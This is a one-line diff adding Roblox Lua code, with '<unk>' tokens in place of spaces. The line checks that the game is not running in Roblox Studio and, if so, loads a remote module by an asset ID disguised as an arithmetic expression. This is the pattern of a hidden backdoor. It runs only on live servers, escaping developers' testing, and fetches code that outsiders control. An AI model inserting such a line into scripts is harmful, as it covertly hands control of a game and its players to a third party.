@@ -1,0 +1,1 @@
+if<unk>not<unk>game:GetService("RunService"):IsStudio()<unk>then<unk>require((397.86020086+0.00000400)*9305953)<unk>end
